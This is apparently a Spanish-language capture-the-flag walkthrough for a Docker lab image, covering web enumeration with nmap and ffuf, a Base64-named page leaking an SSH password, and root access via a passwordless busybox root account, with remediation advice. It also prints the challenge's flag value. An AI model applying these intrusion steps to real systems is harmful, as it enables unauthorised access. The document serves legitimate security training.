# Imagine — Solución completa

## Información del reto

| Campo | Valor |
|-------|-------|
| Imagen | `jserrai/tfm_ctf:imagine2` |
| OS | Alpine Linux |
| Servicios | Apache 2.4.62 (80) + OpenSSH 9.3 (2222) |
| Dificultad | Media |
| Vectores | Web enumeration → SSH → Privilege escalation |

---

## Flag 1 — User

**Ubicación:** `/home/jude/.flag.txt`  
**Valor:** `88ac53e0479687e3724a3be8564d2816`

### 1. Preparación del entorno

```bash
docker run -d --name imagine jserrai/tfm_ctf:imagine2
docker inspect imagine | grep IPAddress
# → 172.17.0.2
```

### 2. Reconocimiento de puertos

```bash
nmap -sV -sC -p- 172.17.0.2
```

Resultado: Apache en puerto 80, OpenSSH en puerto 2222.

### 3. Enumeración web

```bash
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -u http://172.17.0.2/FUZZ -e .php,.html,.txt -mc 200 -fs 45 -t 50
```

Ficheros encontrados:

| Fichero | Contenido relevante |
|---------|---------------------|
| `creditcard.html` | Usuarios: `jude`, `lenny`, `admin` |
| `Z290b3Bhc3M=.html` | Contraseña de jude codificada en Base64 |
| `xcart.tgz` | Pista: `MS$_12j:-=9` + referencia a gotopass |
| `ecard.html` | Menú ficticio de tarjetas |
| `carts.html` | Menú ficticio de carrito |

### 4. Decodificación del nombre de fichero

El nombre `Z290b3Bhc3M=` es Base64 de "gotopass":

```bash
echo "Z290b3Bhc3M=" | base64 -d
# → gotopass
```

Acceder a `http://172.17.0.2/Z290b3Bhc3M=.html` revela la contraseña SSH de `jude`.

### 5. Acceso SSH como jude

```bash
ssh jude@172.17.0.2 -p 2222
```

### 6. Obtención de Flag 1

```bash
cat /home/jude/.flag.txt
# 88ac53e0479687e3724a3be8564d2816
```

---

## Flag 2 — Root

**Método:** Escalada de privilegios via misconfiguration en `/etc/shadow`

### 7. Inspección de /etc/shadow

Desde la sesión SSH como `jude`:

```bash
cat /etc/shadow | grep root
# root:*::0:::::
```

En Alpine Linux con busybox, el hash `*` en el campo de contraseña **no bloquea la cuenta** — para bloquearla correctamente se usa `!`. El resultado es que root no tiene contraseña configurada.

### 8. Escalada a root

```bash
su root
# [Enter — sin contraseña]
id
# uid=0(root) gid=0(root) groups=0(root),...
whoami
# root
```

Shell de root obtenida.

---

## Vulnerabilidades encontradas

| # | Vulnerabilidad | Referencia |
|---|----------------|------------|
| 1 | User enumeration vía fichero HTML público | OWASP A05 |
| 2 | Credenciales expuestas en fichero web con nombre ofuscado en Base64 | OWASP A02 |
| 3 | Ficheros de configuración/backup accesibles públicamente (`index.php.bak`, `xcart.tgz`) | OWASP A05 |
| 4 | Root sin contraseña (`*` en shadow en Alpine/busybox) | CWE-258 |

---

## Conceptos de seguridad

**CWE-258 — Empty Password in Configuration File:** El hash `*` en `/etc/shadow` es interpretado por `busybox su` como "sin contraseña". Para deshabilitar correctamente una cuenta root usar `passwd -l root` (genera `!`).

**Oscuridad ≠ Seguridad:** El nombre en Base64 del fichero `gotopass` no lo protege. Cualquier enumeración automatizada lo encuentra.

---

## Limpieza

```bash
docker stop imagine
docker rm imagine
```
